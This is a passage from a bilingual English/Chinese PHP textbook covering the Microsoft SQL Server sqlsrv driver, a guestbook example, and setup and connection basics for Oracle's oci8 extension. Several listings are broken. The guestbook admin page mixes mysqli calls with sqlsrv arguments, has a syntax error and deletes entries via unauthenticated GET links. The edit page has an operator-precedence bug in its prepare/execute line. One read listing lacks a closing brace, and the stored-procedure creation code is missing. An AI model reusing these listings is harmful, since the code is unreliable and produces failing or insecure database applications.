在本节中，我们将简要介绍当前版本 5.12.0 的驱动程序的工作原理。它支持 PHP 8.1 到 8.3 版本。您可以在 https://github.com/Microsoft/msphpsql/releases 下载这些以及更老（和可能更新！）版本的扩展，位置有些隐蔽，在 Assets 下方（参见图 21.2）。

![](img/ae7820c36e8f24c1623d26668b28e80e_621_0.png)

Figure 21.2 Download the Extension for SQL Server on GitHub

图 21.2 在 GitHub 上下载 SQL Server 扩展

In the following examples, we use the Windows package. The archive contains extensions for 32-bit (x86) and 64-bit (x64) PHP versions. Here are the files for PHP 8.3:

在以下示例中，我们使用 Windows 包。存档包含 32 位（x86）和 64 位（x64）PHP 版本的扩展。以下是 PHP 8.3 的文件：

- php_pdo_sqlsrv_83_nts_x86.dll
- php_pdo_sqlsrv_83_nts_x64.dll
- php_pdo_sqlsrv_83_ts_x86.dll
- php_pdo_sqlsrv_83_ts_x64.dll
- php_sqlsrv_83_nts_x86.dll
- php_sqlsrv_83_nts_x64.dll
- php_sqlsrv_83_ts_x86.dll
- php_sqlsrv_83_ts_x64.dll

As you can see from the file names, you have to make two decisions:

从文件名可以看出，您需要做出两个决定：

- The type of web server. Here, `ts` stands for *thread-safe*, `nts` for *not thread-safe*. If you use the IIS as a web server, you can use the non-thread-safe versions. These are more performant than the thread-safe versions that you need for Apache, for example.
- Whether you use PDO (the first two files) or go directly to the SQL server via an extension.

- Web 服务器类型。在这里，`ts` 代表 *线程安全*，`nts` 代表 *非线程安全*。如果您使用 IIS 作为 Web 服务器，可以使用非线程安全版本。这些版本比您需要为 Apache 等使用的线程安全版本性能更好。
- 您是使用 PDO（前两个文件）还是通过扩展直接访问 SQL 服务器。

Copy the appropriate file for your system into the PHP extension directory and add a corresponding instruction to `php.ini`–for example:

将适合您系统的文件复制到 PHP 扩展目录，并在 `php.ini` 中添加相应的指令–例如：

```
extension=php_sqlsrv_83_nts_x64.dll
```

You also need the Microsoft ODBC Driver for SQL Server in at least version 13 (the current version is 18). The corresponding link is http://s-prs.co/v60226.

您还需要至少版本 13 的 Microsoft ODBC Driver for SQL Server（当前版本为 18）。相应的链接是 http://s-prs.co/v60226。

If everything went well, you will find an entry for the `sqlsrv` extension in the output of `phpinfo()` (see Figure 21.3).

如果一切顺利，您将在 `phpinfo()` 的输出中找到 `sqlsrv` 扩展的条目（参见图 21.3）。

![](img/ae7820c36e8f24c1623d26668b28e80e_622_0.png)

Figure 21.3 The Microsoft Extension Is Installed

图 21.3 Microsoft 扩展已安装

> **Note: Functions or Methods?**
> Installation instructions for other operating systems and further information can be found on the aforementioned project page at https://github.com/Microsoft/msphpsql.

> **注意：函数还是方法？**
> 有关其他操作系统的安装说明和更多信息，可以在上述项目页面 https://github.com/Microsoft/msphpsql 上找到。

### 21.2.1 Connection Setup

### 21.2.1 连接设置

The API of the sqlsrv extension is similar to that of other database extensions such as mysqli, but there are a few differences. This can already be seen when establishing a connection. The function responsible for this, sqlsrv_connect(), expects only two parameters: the server name and an array with connection options. In the simplest case, you simply specify the server name; the current Windows user under which the PHP script is running then only requires the corresponding database authorizations:

sqlsrv 扩展的 API 与 mysqli 等其他数据库扩展类似，但存在一些差异。在建立连接时就可以看出这一点。负责此操作的函数 sqlsrv_connect() 只接受两个参数：服务器名称和包含连接选项的数组。在最简单的情况下，您只需指定服务器名称；运行 PHP 脚本的当前 Windows 用户只需具备相应的数据库授权即可：

```
sqlsrv_connect("(local)\\SQLEXPRESS")
```

You must specify the database you want to access in the second parameter:

必须在第二个参数中指定要访问的数据库：

```
sqlsrv_connect(
    "(local)\\SQLEXPRESS",
    ["Database" => "PHP"]);
```

If you do want to connect to the server using a user name and password, you can use the following syntax:

如果您确实想使用用户名和密码连接到服务器，可以使用以下语法：

```
sqlsrv_connect(
    "(local)\\SQLEXPRESS",
    ["UID" => "user", "PWD" => "password"]);
```

The following listing shows a simple example that only establishes a connection to the server.

以下示例仅演示如何建立与服务器的连接。

```
<?php
if ($db = sqlsrv_connect("(local)\\SQLEXPRESS")) {
    echo "Connection successful.";
    sqlsrv_close($db);
} else {
    echo "Error!";
}
?>
```

Listing 21.1 Connection Setup with the Microsoft Driver ("sqlsrv-connect.php")

清单 21.1 使用 Microsoft 驱动程序进行连接设置（"sqlsrv-connect.php"）

> Tip
> As in the previous chapters, we have dispensed with "proper" error handling for reasons of clarity. The sqlsrv_errors() function, for example, returns all error information.

> 提示
> 与前几章一样，出于清晰起见，我们省略了“正确”的错误处理。例如，sqlsrv_errors() 函数会返回所有错误信息。

### 21.2.2 Queries

### 21.2.2 查询

To send a query to the SQL server database, use the sqlsrv_query() function. Two arguments are required: the database connection (returned by sqlsrv_connect()) and the SQL command. You can see an example in the following listing.

要向 SQL Server 数据库发送查询，请使用 sqlsrv_query() 函数。需要两个参数：数据库连接（由 sqlsrv_connect() 返回）和 SQL 命令。您可以在以下示例中看到示例。

```
<?php
if ($db = sqlsrv_connect(
    "(local)\\SQLEXPRESS",
    ["Database" => "PHP"])) {
$sql = "CREATE TABLE my_table (
    id INT IDENTITY NOT NULL,
    field VARCHAR(255)
)";
if (sqlsrv_query($db, $sql)) {
    echo "Table created.<br />";
} else {
    echo "Error!";
}
$sql = "INSERT INTO my_table (field) VALUES ('Value1')";
if (sqlsrv_query($db, $sql)) {
    echo "Data entered.<br />";
} else {
    echo "Error!";
}
$sql = "INSERT INTO my_table (field) VALUES ('Value2')";
if (sqlsrv_query($db, $sql)) {
    echo "Data entered.";
} else {
    echo "Error!";
    die(print_r( sqlsrv_errors(), true));
}
sqlsrv_close($db);
} else {
    echo "Error!";
}
?>
```

Listing 21.2 Create and Fill Table with the Microsoft Driver ("sqlsrv-query.php")

清单 21.2 使用 Microsoft 驱动程序创建并填充表（"sqlsrv-query.php"）

### 21.2.3 Return Values

### 21.2.3 返回值

When reading return values, the while loop is used again, which iterates over the returns from a database function. This function is called sqlsrv_fetch_array() in the sqlsrv extension. This leads to the code in the following listing.

读取返回值时，会再次使用 while 循环，它遍历数据库函数返回的结果。在 sqlsrv 扩展中，此函数名为 sqlsrv_fetch_array()。这导致了以下示例中的代码。

```
<?php
if ($db = sqlsrv_connect(
    "(local)\\SQLEXPRESS",
    ["Database" => "PHP"])) {
$sql = "SELECT * FROM my_table";
if ($result = sqlsrv_query($db, $sql)) {
echo "<ul>";
while ($row = sqlsrv_fetch_array($result)) {
    echo "<li>" . htmlspecialchars($row["id"]) .
         ": " . htmlspecialchars($row["field"]) . "</li>";
}
echo "</ul>";
sqlsrv_close($db);
} else {
    echo "Error!";
}
?>
```

Listing 21.3 All Query Data as an Associative Array with the Microsoft Driver ("sqlsrv-read.php")

清单 21.3 使用 Microsoft 驱动程序将所有查询数据作为关联数组（"sqlsrv-read.php"）

Reading using objects is very similar, but the function name changes from sqlsrv_fetch_array() to sqlsrv_fetch_object() and the access from $row["column"] to $row->column.

使用对象读取非常相似，但函数名从 sqlsrv_fetch_array() 更改为 sqlsrv_fetch_object()，访问方式从 $row["column"] 更改为 $row->column。

```
<?php
if ($db = sqlsrv_connect(
    "(local)\\SQLEXPRESS",
    ["Database" => "PHP"])) {
    $sql = "SELECT * FROM my_table";
    if ($result = sqlsrv_query($db, $sql)) {
        echo "<ul>";
        while ($row = sqlsrv_fetch_object($result)) {
            echo "<li>" . htmlspecialchars($row->id) .
                 ": " . htmlspecialchars($row->field) . "</li>";
        }
        echo "</ul>";
    }
    sqlsrv_close($db);
} else {
    echo "Error!";
}
?>
```

Listing 21.4 All Query Data as Object ("sqlsrv-read-object.php")

清单 21.4 所有查询数据作为对象（"sqlsrv-read-object.php"）

### Alternative Fetch Method

### 替代读取方法

There is another method for reading data, sqlsrv_fetch(), which reads in a data record from the results list but does not initially offer a return value. However, you can then use sqlsrv_get_field() to access individual columns of the data set via their number, as follows:

读取数据还有另一种方法，sqlsrv_fetch()，它从结果列表中读取一条数据记录，但最初不提供返回值。不过，您可以随后使用 sqlsrv_get_field() 通过编号访问数据集中的单个列，如下所示：

```
while (sqlsrv_fetch($result)) {
 echo "<li>" . htmlspecialchars(sqlsrv_get_field($result, 0)) .
 " : " . htmlspecialchars(sqlsrv_get_field($result, 1)) . "</li>";
}
```

### 21.2.4 Special Features

### 21.2.4 特殊功能

In addition to the "classic" use cases shown previously, the sqlsrv extension also offers numerous advanced features, the most important of which are presented ahead, each with a short code example.

除了之前展示的“经典”用例外，sqlsrv 扩展还提供众多高级功能，下面将介绍其中最重要的功能，每个功能都附有简短代码示例。

### Prepared Statements

### 预处理语句

Of course, the sqlsrv extension also offers parameterized queries. For this, you must first create a command object. Use question marks as placeholders in the SQL code:

当然，sqlsrv 扩展也提供参数化查询。为此，您必须先创建一个命令对象。在 SQL 代码中使用问号作为占位符：

```
$sql = "INSERT INTO my_table (field) VALUES (?)";
```

With sqlsrv_prepare(), you create the command object. You pass the values for the placeholders as an array, even if you only use one placeholder as in the example. Note that the values in the array must be transferred as a reference or you will receive a warning:

使用 sqlsrv_prepare() 创建命令对象。您将占位符的值作为数组传递，即使您只使用一个占位符，如示例所示。请注意，数组中的值必须作为引用传递，否则您将收到警告：

```
$value = "123";
$stmt = sqlsrv_prepare($db, $sql, [&$value]);
```

In the last step, execute the command with sqlsrv_execute():

最后一步，使用 sqlsrv_execute() 执行命令：

```
sqlsrv_execute($stmt);
```

The following listing shows a related example that allows users to add additional values to the database using a small HTML form.

以下示例展示了一个相关示例，允许用户使用小型 HTML 表单向数据库添加其他值。

```
<?php
if (isset($_POST['value']) && is_string($_POST['value'])) {
 if ($db = sqlsrv_connect(
     "(local)\\SQLEXPRESS",
     ["Database" => "PHP"])) {
     $sql = "INSERT INTO my_table (field) VALUES (?)";
     $stmt = sqlsrv_prepare($db, $sql, [&$_POST['value']]);
     if (sqlsrv_execute($stmt)) {
         echo "Data entered.<br />";
     } else {
         echo "Error!";
     }
}
```




}
echo "Value entered!";
sqlsrv_close($db);
} else {
echo "Error!";
}
}
?>
<form method="post" action="">
<input type="text" name="value" />
<input type="submit" value="Enter" />
</form>

## 清单 21.5 带微软驱动程序的参数化查询 ("sqlsrv-parameter.php")

## 最后插入的自动值

由于 MSSQL 通过 IDENTITY 提供自动值，自然会想知道如何确定最后插入的自动值。该命令为 SELECT @@IDENTITY FROM my_table。但是，您应确保一次性完成插入和读取操作——例如，在一个事务中（这由 sqlsrv_begin_transaction() 和 sqlsrv_commit() 函数完成）。但是，作为示例，连续发送两个命令也是足够的。以下代码向测试表中插入另一个值并读取自动值。在 SELECT 命令中，我们不使用 AS 别名，因此需要将查询作为数值数组返回。

## 清单 21.6 读取最后的自动值 ("sqlsrv-read-autovalue.php")

```php
<?php
if ($db = sqlsrv_connect(
"(local)\\SQLEXPRESS",
["Database" => "PHP"])) {
$sql = "SELECT * FROM my_table";
$sql = "INSERT INTO my_table (field) VALUES ('value3')";
if (sqlsrv_query($db, $sql)) {
echo "Data entered.<br />";
} else {
echo "Error!";
}
$sql = "SELECT @@IDENTITY FROM my_table";
if ($result = sqlsrv_query($db, $sql)) {
sqlsrv_fetch($result);
$id = sqlsrv_get_field($result, 0);
echo "Data entered with ID $id.";
} else {
echo "Error!";
}
sqlsrv_close($db);
} else {
    echo "Error!";
}
?>
```

## 关于结果的信息

执行 SQL 语句后，可以使用其他辅助函数来获取查询结果的更多信息。例如，sqlsrv_rows_affected() 返回查询影响的数据库行数（即由 UPDATE 更新、DELETE 删除或 INSERT 插入的行数）。对于 SELECT *，sqlsrv_num_rows() 返回结果列表中的字段数（另请参见前文的“其他有用函数”部分）。

## 存储过程

使用存储过程（有些人称其为嵌入式过程），可以将多个数据库查询直接封装在数据库中的代码块内。这是许多 Web 机构的常见做法：数据库管理员是唯一拥有数据库完全访问权限的人；Web 应用程序（及其开发人员）只能调用特殊的存储过程。这在开发过程中避免了很多麻烦。

之前关于插入和返回自动值的示例，在存储过程中的实现如下：

```sql
CREATE PROCEDURE pr_insert (
@value VARCHAR(50)
)
AS
INSERT INTO my_table (field) VALUES (@value)
SELECT @@IDENTITY FROM my_table
GO
```

您可以使用工具插入此存储过程，也可以让 PHP 脚本来插入它，如下一个清单所示。

## 清单 21.7 创建存储过程 ... ("sqlsrv-sp-create.php")

要执行存储过程，请在 SQL 代码中使用 EXEC 或 CALL 执行它，如下一个完整清单所示。

## 清单 21.8 ... 和调用 ("sqlsrv-sp-call.php")

```php
<?php
if ($db = sqlsrv_connect(
"(local)\\SQLEXPRESS",
["Database" => "PHP"])) {
$sql = "call pr_insert(?)";
$value = "value4";
$parameter = [
    [$value, SQLSRV_PARAM_IN]
];
if ($result = sqlsrv_query($db, $sql, $parameter)) {
echo "Stored procedure called.";
} else {
echo "Error!";
}
sqlsrv_close($db);
} else {
echo "Error!";
}
?>
```

## 其他有用函数

SQL Server 驱动程序 for PHP API 当然比先前介绍的更广泛。以下是一些更多有用的函数：

- **sqlsrv_has_rows()** 确定结果列表是否包含任何数据
- **sqlsrv_num_rows()** 结果列表中的行数
- **sqlsrv_server_info()** 关于数据库的信息（作为带有版本号等信息的关联数组）

微软驱动程序潜力巨大，因为它正在积极开发中，这与 mssql 扩展不同。然而，问题仍然在于它是否最终会成为 PHP 的官方部分，或者是否会继续作为专有的微软“产品”，尽管代码是开源的。

## 21.3 应用示例

本章以必备的留言本示例结束。与之前章节中给出的建议一样，这里也适用：正确设置权限，并在必要时调整 `sqlsrv_connect()` 的参数。

### 21.3.1 创建表

要创建表，最好直接使用 `sqlsrv_query()` 将相关语句发送到数据库。或者，也可以使用管理工作室或类似工具。

## 清单 21.9 创建表 ("gb-create.php")

```php
<?php
if ($db = sqlsrv_connect(
    "(local)\\SQLEXPRESS",
    ["Database" => "PHP"])) {
    $sql = "CREATE TABLE guestbook (
    id INT IDENTITY NOT NULL,
    heading VARCHAR(1000),
    entry VARCHAR(5000),
    author VARCHAR(50),
    email VARCHAR(100),
    date DATETIME,
    PRIMARY KEY (id)
    )";
    if (sqlsrv_query($db, $sql)) {
    echo "Table created.<br />";
    } else {
    echo "Error!";
    }
    sqlsrv_close($db);
} else {
    echo "Error!";
}
?>
```

### 21.3.2 输入数据

要将数据输入数据库，请创建预处理语句以避免 SQL 注入。使用 SELECT @@IDENTITY，可以确定（并输出）插入过程的自动值。

以下清单显示了手动插入的代码。

## 清单 21.10 可以输入数据 ("gb-enter.php")

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_POST["Name"]) &&
isset($_POST["Email"]) &&
isset($_POST["Heading"]) &&
isset($_POST["Comment"])) {
if ($db = sqlsrv_connect(
"(local)\\SQLEXPRESS",
["Database" => "PHP"])) {
$sql = "INSERT INTO guestbook
(heading,
entry,
author,
email,
date)
VALUES (?, ?, ?, ?, ?)";
$date = date("Y-m-d H:i:s");
$parameter = [
&$_POST["Heading"],
&$_POST["Comment"],
&$_POST["Name"],
&$_POST["Email"],
$date,
];
if ($command = sqlsrv_prepare($db, $sql, $parameter)) {
if (sqlsrv_execute($command)) {
$result = sqlsrv_query($db, "SELECT @@IDENTITY");
sqlsrv_fetch($result);
$id = sqlsrv_get_field($result, 0);
echo "Entry added.
<a href=\"gb-edit.php?id=$id\">Edit</a>";
} else {
echo "Error!";
}
} else {
echo "Error!";
}
sqlsrv_close($db);
} else {
echo "Error!";
}
}
?>
<form method="post" action="">
Name <input type="text" name="Name" /> <br />
Email address <input type="text" name="Email" /> <br />
Heading <input type="text" name="Heading" /> <br />
Comment
<textarea cols="70" rows="10" name="Comment"></textarea><br />
<input type="submit" name="Submit" value="Submit" />
</form>
</body>
</html>
```

### 21.3.3 输出数据

要输出数据，可以使用 sqlsrv_fetch_* 函数之一。这里我们使用对象变体，但具体如何操作纯粹是个人偏好问题。

## 清单 21.11 输出留言本数据 ("gb-show.php")

```html
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if ($db = sqlsrv_connect(
    "(local)\\SQLEXPRESS",
    ["Database" => "PHP"])) {
    $sql = "SELECT * FROM guestbook ORDER BY date DESC";
    $result = sqlsrv_query($db, $sql);
    while ($row = sqlsrv_fetch_object($result)) {
        printf("<p><a href=\"mailto:%s\">%s</a> wrote on/at %s:</p>
<h3>%s</h3><p>%s</p><hr noshade=\"noshade\" />",
            urlencode($row->email),
            htmlspecialchars($row->author),
            htmlspecialchars($row->date->format("Y-m-d H:i:s")),
            htmlspecialchars($row->heading),
            nl2br(htmlspecialchars($row->entry)));
    }
    sqlsrv_close($db);
} else {
    echo "Error!";
}
?>
</body>
</html>
```

### 图 21.4 留言本中的条目

![](img/ae7820c36e8f24c1623d26668b28e80e_633_0.png)




如图 21.4 所示，日期值尚未完美输出。因此，此时值得再次从 PHP 解析返回值。

## 21.3.4 删除数据

删除操作是通过检查通过 URL 指定的信息来完成的，即读取 $_GET。

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
if (isset($_GET["id"]) && is_numeric($_GET["id"])) {
    if (isset($_GET["ok"])) {
        if ($db = mysqli_connect(
            "localhost\\SQLEXPRESS",
            ["Database" => "PHP"]])) {
            $id = intval($_GET["id"]);
            $sql = "DELETE FROM guestbook WHERE id=$id";
            if (mysqli_query($db, $sql)) {
                echo "<p>Entry deleted.</p>
<p><a href=\"gb-admin.php\">Back to overview</a></p>";
            } else {
                echo "Error!";
            }
            mysqli_close($db);
        } else {
            echo "Error!";
        }
    } else {
        printf("<a href=\"gb-admin.php?id=%s&ok=1\">Really delete?</a>", urlencode($_GET["id"]));
    }
} else {
    if ($db = mysqli_connect(
        "localhost\\SQLEXPRESS",
        ["Database" => "PHP"]])) {
        $sql = "SELECT * FROM guestbook ORDER BY date DESC";
        $result = mysqli_query($db, $sql);
        while ($row = mysqli_fetch_object($result)) {
            printf("<p><b><a href=\"gb-admin.php?id=%s\">Delete this entry </a> - <a href=\"gb-edit.php?id=%s\">Edit this entry</a></b></p>
<p><a href=\"mailto:%s\">%s</a> wrote on/at %s:</p>
<h3>%s</h3><p></p><hr noshade=\"noshade\" />",
                urldecode($row->id),
                urldecode($row->id),
                htmlspecialchars($row->email),
                htmlspecialchars($row->author),
                htmlspecialchars($row->date->format("Y-m-d H:i:s")),
                htmlspecialchars($row->heading),
                nl2br(htmlspecialchars($row->entry)));
        }
        sqlsrv_close($db);
    } else {
        echo "Error!";
    }
}
?>
</body>
</html>
```

### 清单 21.12 包含删除选项的所有数据显示（"gb-admin.php"）

## 21.3.5 编辑数据

最后，下面的清单既读取数据，又将其发送回数据库（通过 UPDATE）。此前关于插入操作的说明同样适用于更新过程：如先前所示，使用存储过程会更高效、更安全。

```php
<html>
<head>
<title>Guestbook</title>
</head>
<body>
<h1>Guestbook</h1>
<?php
$Name = "";
$Email = "";
$Heading = "";
$Comment = "";
if (isset($_GET["id"]) && is_numeric($_GET["id"])) {
    if ($db = sqlsrv_connect(
        "(local)\\SQLEXPRESS",
        ["Database" => "PHP"])) {
        if (isset($_POST["Name"]) &&
            isset($_POST["Email"]) &&
            isset($_POST["Heading"]) &&
            isset($_POST["Comment"])) {
            $sql = "UPDATE guestbook SET
heading = ?,
entry = ?,
author = ?,
email = ?
WHERE id = ?";
            $parameter = [
                $_POST["Heading"],
                $_POST["Comment"],
                $_POST["Name"],
                $_POST["Email"],
                $_GET["id"]
            ];
            if ($command = sqlsrv_prepare($db, $sql, $parameter) &&
                sqlsrv_execute($command)) {
                echo "<p>Entry changed.</p>
<p><a href=\"gb-admin.php\">Back to overview</a></p>";
            } else {
                echo "Error!";
            }
        }
        $sql = sprintf("SELECT * FROM guestbook WHERE id=%s",
            intval($_GET["id"]));
        $result = sqlsrv_query($db, $sql);
        if ($row = sqlsrv_fetch_object($result)) {
            $Name = $row->author;
            $Email = $row->email;
            $Heading = $row->heading;
            $Comment = $row->entry;
        }
        sqlsrv_close($db);
    } else {
        echo "Error!";
    }
}
?>
<form method="post" action="">
Name <input type="text" name="Name" value="<?php echo htmlspecialchars($Name); ?>" /><br />
Email address <input type="text" name="Email" value="<?php echo htmlspecialchars($Email); ?>" /><br />
Heading <input type="text" name="Heading" value="<?php echo htmlspecialchars($Heading); ?>" /><br />
Comment
<textarea cols="70" rows="10" name="Comment"><?php echo htmlspecialchars($Comment); ?></textarea><br />
<input type="submit" name="Submit" value="Update" />
</form>
</body>
</html>
```

### 清单 21.13 编辑留言本条目（"gb-edit.php"）

# 第 22 章

# Oracle

Oracle 不仅拥有 MySQL 数据库：该公司的主力产品依然是 Oracle 数据库服务器。该产品也为 PHP 提供了出色的连接。

对 Oracle 众说纷纭。拥护者将该产品视为终极数据库，在功能和性能方面无懈可击¹。批评者则对该数据库相比竞争对手的诸多特性感到惊讶。换句话说：由于自带的工具很好，（几乎）任何人都可以使用 Microsoft SQL Server，而 Oracle 在许多人的眼中在专业应用中更为强大。

然而，本书的目的并不是要灌输偏爱的数据库，而是从 PHP 控制的角度介绍市场上所有相关产品。因此，你在本章中也将了解操作数据库时最重要的命令。

## 22.1 准备工作

首先需要 Oracle。可以从 Oracle 的技术资源（原 Oracle Technology Network，www.oracle.com/technical-resources）下载测试版本。

与 Microsoft 类似，Oracle 现在也提供功能略有缩减的免费数据库版本。它被称为 Oracle XE（XE 代表 Express Edition），可在免费注册后针对 Windows 和 Linux 下载，地址为 http://s-prs.co/v602227（参见图 22.1）。

不过，Debian 和 Ubuntu 用户在系统上分发该软件，比从 Oracle 网站获取它要容易得多。

Oracle 模块已包含在面向 Windows 的主 PHP ZIP 包中。根据你想使用的客户端库版本，在 `php.ini` 中去掉以下两行行首的分号即可安装相应扩展。例如，PHP 8.3 默认仅包含后者扩展：

```ini
;extension=oci8_12c ; Use with Oracle Database 12c Instant Client
;extension=oci8_19 ; Use with Oracle Database 19 Instant Client
```

¹ 但并非“攻无不克”。当大量漏洞被发现时（如同所有其他相关数据库一样），Oracle 被迫在广告口号中收回这一说法。

![](img/ae7820c36e8f24c1623d26668b28e80e_640_0.png)

### 图 22.1 Oracle XE 下载

不过，使用该扩展的前提是已安装 php.ini 注释中已提及的 Oracle Instant Client（http://s.prs.co/v602228）。在 Windows 上需注意，因为你还需要 Microsoft Visual C++ Redistributable；确切版本在 Oracle 下载页面上有链接。

加载扩展 DLL 会加载一整套 Oracle 客户端 DLL，因此 Instant Client 也必须位于路径中。为此，Web 服务器自然需要对相应目录的读取权限。例如，IIS 在用户帐户 IUSR_<机器名> 下运行，仍需分配此权限。请务必在“高级”中指定要用新权限替换整个目录的旧权限。

> **提示**
> 如果你没有更改这些权限的选项（通常通过文件属性中的“安全”选项卡），请在文件夹选项中禁用简单文件共享。

在 Unix/Linux 下，使用 --with-oci8 编译开关。应设置 ORACLE_HOME 环境变量，因为 PHP 会在该目录中搜索 Oracle 客户端库。或者，也可以直接指定目录：--with-oci8=/path/to/oracle。如果要使用 PECL，安装过程与往常相同：

```bash
pecl install oci8
```

在两种操作系统中，你还需要包含 Oracle 安装信息的环境变量：

- **ORACLE_HOME** – Oracle 安装目录
- **ORACLE_SID** – 数据库名称
- **NLS_LANG** – 使用的语言设置
- **ORA_SDTZ** – 使用的会话时区

Windows 用户在安装 Oracle 并重启后（重要！）可在注册表中找到此信息。Unix/Linux 用户还需要 LD_LIBRARY_PATH 变量，以便找到库文件。这些操作系统的另一个要求是，Apache 中必须链接 pthread 库。可以使用 ldd /path/to/httpd 进行检查（参见图 22.2）。

```bash
christian@linux:~# su
Password:
linux:/home/christian # ldd /usr/sbin/httpd
libmm.so.11 => /usr/lib/libmm.so.11 (0x40023000)
libm.so.6 => /lib/libm.so.6 (0x40028000)
libcrypt.so.1 => /lib/libcrypt.so.1 (0x4004b000)
libgdbm.so.2 => /usr/lib/libgdbm.so.2 (0x40076000)
libdb-4.0.so => /usr/lib/libdb-4.0.so (0x40086000)
libexpat.so.0 => /usr/lib/libexpat.so.0 (0x4011e000)
libdl.so.2 => /lib/libdl.so.2 (0x40410000)
libc.so.6 => /lib/libc.so.6 (0x40044000)
/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
linux:/home/christian #
```

### 图 22.2 需要重新安装：此 Apache 未使用 "libpthread"

接着调用 phpinfo() 很有价值，它（希望如此）会显示安装成功（参见图 22.3）。

接下来，你需要相应地预配置本地 Oracle 实例。为此，首先创建一个名为 user、密码为 password 的用户（例如在 SQL*Plus 中）。² 通过为用户分配 connect 权限（在示例中还包括 dba，以便日后访问更加容易），可以特别轻松地完成此操作。如果用户不存在，则直接创建。图 22.4 显示了命令行中的结果。

² 当然，你也可以给用户取不同的名称并分配不同的密码；出于安全考虑，这样做或许更可取。但那样的话，你就需要修改本章中的所有代码示例。

使用 SQL Developer 作为图形用户界面会方便一些。你可以从 http://s-prs.co/v602229 免费下载该工具，但你将



需要 Java 开发工具包（Java 运行时环境不够）。不过，配置工具仍然很有价值，因为你可以轻松创建数据库并在那里进行进一步设置。

![](img/ae7820c36e8f24c1623d26668b28e80e_642_0.png)

图 22.3 扩展安装成功

![](img/ae7820c36e8f24c1623d26668b28e80e_642_1.png)

图 22.4 已创建新用户

最后，你需要决定 PHP 应该如何连接到 Oracle。这里有几个选项：

- 本地 Oracle 实例的名称。
- 存储在 tnsnames.ora 配置文件中的连接名称。
- 使用 EasyConnect 语法，该语法可从 Oracle 10g 版本开始使用。连接字符串看起来有点像 URL——例如，localhost/服务名。

在下文中，我们假设使用 "orcl" 作为连接字符串，既可以作为 TNS 条目，也可以作为本地实例名称。如有必要，请将此连接字符串调整为适合您的系统，并确保测试用户也能访问它。

因此，安装和配置可能需要一些时间；如果出现问题，值得查看 PHP 在线手册中的用户评论。Oracle 还针对 PHP 使用提供了专门的常见问题解答：

- [关于使用 PHP 的一般信息](http://s-prs.co/v602230)
- [地下 PHP 和 Oracle 手册](http://s-prs.co/v602231)，一本关于使用 PHP 和 Oracle 进行开发的详细手册。（出版时，它已与 Oracle 11g R2 保持同步。）
- [PECL 中的 Oracle 扩展](http://s-prs.co/v602232)，当前正在维护，并且通常比随 PHP 提供的版本更新。从第 3 版开始，该扩展与 PHP 8 兼容；对于 PHP 7，最好使用版本 2.2。

## 22.2 使用 Oracle 进行数据库访问

我们的新用户自然也希望使用数据库。相关任务将在下文各节中说明。首先提个醒：在致力于使 PHP 函数名更加一致的非常值得称赞的努力过程中，PHP 5 起有些东西已经改变了。现在函数名的所有部分都用下划线分隔——例如，oci_connect() 和 oci_fetch()。早期版本并非如此，那两个函数有时叫法不同，并且都不带下划线：ocilogon() 和 ocifetch()。出于兼容性原因，旧函数名仍然有效，但我们只使用新变体。

### 22.2.1 连接建立

使用 oci_connect() 建立连接。前两个参数——与其他一些 PHP 数据库模块一样——是用户名和密码；第三个参数是在 tnsnames.ora 文件中输入的服务名（除非设置了环境变量或 ORACLE_SID 注册表项，在这种情况下可以省略该参数）。函数的返回值是一个数据库句柄，如果出错则为 false。oci_close() 函数会再次关闭连接。

```php
<?php
if ($db = oci_connect("user", "password", "orcl")) {
    echo "Connection successful.";
    oci_close($db);
} else {
    echo "Error!";
}
?>
```

清单 22.1 已建立连接（“oci-connect.php”）

> **提示**
> 如果在此处出现错误，通常是因为环境变量未正确设置，或者 tnsnames.ora 文件包含 Windows 换行符。

### 错误处理

本章中的示例只会输出一条相当平淡的错误消息；它们不会抑制各个函数的实际错误消息（出于调试原因），这可以通过在函数名前使用 at 符号（@）来实现。

不过，为此有一种特殊机制。oci_error() 返回关于上次发生的错误的信息。以下可以作为参数传递：

- 建立连接时出错时不需要参数
- 解析 SQL 命令时出错时为数据库句柄
- 执行 SQL 命令时出错时为命令对象

关联数组包含以下字段：

- **代码**
  Oracle 的错误代码
- **消息**
  Oracle 的错误文本
- **偏移量**
  错误位置
- **SQL 文本**
  错误的 SQL 代码

### 22.2.2 查询

对数据库的查询分两步进行：

- oci_parse() 解析 SQL 命令并从中创建一个对象。
- oci_execute() 将对象发送到数据库。

不过，这可能意味着数据尚未被完全提交，因为 Oracle 中默认禁用自动提交。你可以为 oci_execute() 可选地指定执行模式。这有些令人困惑，因为有两个相关模式（以及其他一些模式）：

- OCI_DEFAULT 没有自动提交，但——尽管名字如此——不是默认值。
- OCI_COMMIT_ON_SUCCESS 在未发生错误时会导致 COMMIT。这是默认值。

如果使用 OCI_DEFAULT，还必须调用 oci_commit()，以便对数据库的更改真正生效。

创建测试表时有一些特殊之处。首先，在 Oracle 中通常使用 VARCHAR2 数据类型（而不是 VARCHAR）：

```
CREATE TABLE my_table (
 id NUMBER(10) PRIMARY KEY,
 field VARCHAR2(1000) )
;
```

另一方面，自动值并非那么简单：它们不存在。不过，你可以用一个小技巧实现类似的行为。首先创建一个序列：

```
CREATE SEQUENCE my_table_id;
```

现在你还可以设置一个触发器，确保每次插入后序列递增 1（NEXTVAL），然后写入新数据记录：

```
CREATE OR REPLACE TRIGGER my_table_autoIncrement BEFORE INSERT ON my_table
REFERENCING NEW AS NEW OLD AS OLD FOR EACH ROW
BEGIN
SELECT my_table_id.NEXTVAL INTO :NEW.id FROM DUAL;
END;
```

> **注意**
>
> Oracle 中使用伪表 DUAL，即使没有现有表也能生成返回值，以便在 SQL 命令中使用。例如，SELECT 'PHP' FROM DUAL 也可行。其结果是字符串 PHP。

以下清单创建表、插入两个值，然后发出 COMMIT。

```php
<?php
if ($db = oci_connect("user", "password", "orcl")) {
  $sql = "CREATE TABLE my_table (
    id NUMBER(10) PRIMARY KEY,
    field VARCHAR2(1000)
);
CREATE SEQUENCE my_table_id;
CREATE TRIGGER my_table_autoincrement BEFORE INSERT ON my_table
REFERENCING NEW AS NEW OLD AS OLD FOR EACH ROW
BEGIN
SELECT my_table_id.NEXTVAL INTO :NEW.id FROM DUAL;
END;";
$command = oci_parse($db, $sql);
if (oci_execute($command, OCI_DEFAULT)) {
echo "Table created.<br />";
} else {
